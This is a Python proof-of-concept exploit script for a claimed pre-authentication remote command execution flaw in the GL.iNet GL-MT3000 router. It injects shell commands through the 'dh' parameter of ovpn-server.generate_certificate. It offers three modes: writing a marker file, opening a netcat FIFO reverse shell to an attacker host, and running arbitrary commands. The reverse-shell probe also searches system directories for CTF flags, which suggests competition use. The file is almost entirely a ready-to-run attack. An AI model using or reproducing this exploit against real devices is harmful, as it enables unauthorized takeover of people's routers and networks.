#!/usr/bin/env python3
"""
GL.iNet GL-MT3000 4.4.5 `ovpn-server.generate_certificate(dh)` pre-auth RCE PoC

This script is the DH-parameter-only split of the original combined
`ovpn-server.generate_certificate` PoC.  It always injects through `args.dh`:

    POST /cgi-bin/glc
    {"object":"ovpn-server","method":"generate_certificate","args":{"dh":"x; <cmd>; #"}}

Modes:
  - marker: write `/www/OVPN_DH_RCE_<timestamp>.txt` and poll it over HTTP.
  - reverse-shell: send a netcat FIFO reverse shell and run a small probe.
  - --cmd: execute a custom shell command through the DH sink.
"""

import argparse
import json
import re
import socket
import string
import sys
import time
from typing import Any, Tuple

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

INJECT_PARAM = "dh"
OBJECT = "ovpn-server"
METHOD = "generate_certificate"
MARKER_PREFIX = "OVPN_DH_RCE"


def parse_glc_response(text: str) -> Tuple[int | None, Any]:
    text = text.strip()
    m = re.match(r"^(\d+)\s*(.*)$", text, re.S)
    if not m:
        return None, text
    code = int(m.group(1))
    rest = m.group(2).strip()
    if not rest:
        return code, {}
    try:
        return code, json.loads(rest)
    except Exception:
        return code, rest


def rpc_post(sess: requests.Session, base: str, args: dict, verify: bool, timeout: int = 20):
    payload = {"object": OBJECT, "method": METHOD, "args": args}
    r = sess.post(
        f"{base}/cgi-bin/glc",
        data=json.dumps(payload),
        headers={"Content-Type": "application/json"},
        timeout=timeout,
        verify=verify,
    )
    code, data = parse_glc_response(r.text)
    print(f"[RPC] HTTP {r.status_code} glc={code} {OBJECT}.{METHOD} args={args}")
    print(f"[RPC] body: {str(data)[:500]}")
    return r.status_code, code, data


def build_reverse_shell(lhost: str, lport: int) -> str:
    return (
        f"rm -f /tmp/p; mkfifo /tmp/p; "
        f"/bin/sh </tmp/p 2>&1 | /usr/bin/nc {lhost} {lport} >/tmp/p"
    )


def build_marker_command(marker: str) -> str:
    return f"echo {marker} >/www/{marker}.txt"


def inject(cmd: str) -> str:
    return f"x; {cmd}; #"


class ReverseShellListener:
    def __init__(self, bind_host: str, port: int, timeout: int):
        self.bind_host = bind_host
        self.port = port
        self.timeout = timeout
        self.sock = None
        self.conn = None

    def __enter__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.bind_host, self.port))
        self.sock.listen(1)
        self.sock.settimeout(self.timeout)
        print(f"[+] listening on {self.bind_host}:{self.port}")
        return self

    def __exit__(self, exc_type, exc, tb):
        try:
            if self.conn:
                self.conn.close()
        finally:
            if self.sock:
                self.sock.close()

    def accept(self):
        self.conn, addr = self.sock.accept()
        self.conn.settimeout(2)
        print(f"[+] reverse shell connected from {addr[0]}:{addr[1]}")
        return addr

    def run_probe(self):
        marker = "__CMD_DONE_" + "".join([string.ascii_uppercase[i % 26] for i in range(8)])
        cmd = (
            "id; uname -a; echo '[*] flag-hunt-begin'; "
            "grep -R -a -E 'flag\\{|CTF\\{|DASCTF\\{' /etc /root /tmp /overlay /www 2>/dev/null | head -n 50; "
            f"echo {marker}\n"
        )
        self.conn.sendall(cmd.encode())
        chunks = []
        deadline = time.time() + 10
        while time.time() < deadline:
            try:
                data = self.conn.recv(4096)
            except socket.timeout:
                continue
            if not data:
                break
            chunks.append(data)
            if marker.encode() in data or marker.encode() in b"".join(chunks):
                break
        out = b"".join(chunks).decode(errors="replace")
        print("[+] shell output start")
        print(out)
        print("[+] shell output end")
        flags = re.findall(r"(?:flag|FLAG|CTF|DASCTF)\{.*?\}", out)
        if flags:
            print(f"[+] possible flags: {flags}")
        return out


def main():
    ap = argparse.ArgumentParser(description="GL.iNet MT3000 ovpn-server.generate_certificate(dh) pre-auth RCE PoC")
    ap.add_argument("--target", required=True, help="Target host/IP, e.g. 192.168.8.1")
    ap.add_argument("--scheme", default="http", choices=["http", "https"])
    ap.add_argument("--verify", action="store_true", help="Verify TLS certs when using HTTPS")
    ap.add_argument("--mode", default="marker", choices=["marker", "reverse-shell"])
    ap.add_argument("--lhost", help="Reverse shell connect-back host")
    ap.add_argument("--lport", type=int, default=4444, help="Reverse shell connect-back port")
    ap.add_argument("--bind", default="0.0.0.0", help="Local bind host for listener")
    ap.add_argument("--wait", type=int, default=20, help="Wait time for verification or reverse shell")
    ap.add_argument("--cmd", help="Custom shell command; overrides built-in mode payload")
    args = ap.parse_args()

    base = f"{args.scheme}://{args.target}"
    sess = requests.Session()
    marker = None

    if args.cmd:
        shell_cmd = args.cmd
    elif args.mode == "marker":
        marker = f"{MARKER_PREFIX}_{int(time.time())}"
        shell_cmd = build_marker_command(marker)
    else:
        if not args.lhost:
            print("[-] reverse-shell mode requires --lhost", file=sys.stderr)
            sys.exit(1)
        shell_cmd = build_reverse_shell(args.lhost, args.lport)

    inj = inject(shell_cmd)
    rpc_args = {INJECT_PARAM: inj}
    print(f"[+] target={base}")
    print(f"[+] injection param={INJECT_PARAM}")
    print(f"[+] injected value={inj}")

    if args.mode == "reverse-shell" and not args.cmd:
        with ReverseShellListener(args.bind, args.lport, args.wait) as listener:
            rpc_post(sess, base, rpc_args, verify=args.verify)
            listener.accept()
            listener.run_probe()
            return

    rpc_post(sess, base, rpc_args, verify=args.verify)

    if args.cmd:
        print("[+] custom command sent; no automatic marker verification for --cmd")
        return

    url = f"{base}/{marker}.txt"
    print(f"[+] polling {url} for up to {args.wait}s")
    deadline = time.time() + args.wait
    while time.time() < deadline:
        try:
            r = sess.get(url, timeout=5, verify=args.verify)
            if r.status_code == 200 and marker in r.text:
                print(f"[+] RCE confirmed via {INJECT_PARAM}, marker file content: {r.text.strip()}")
                return
        except Exception:
            pass
        time.sleep(1)
    print("[-] marker not observed within timeout")
    sys.exit(2)


if __name__ == "__main__":
    main()
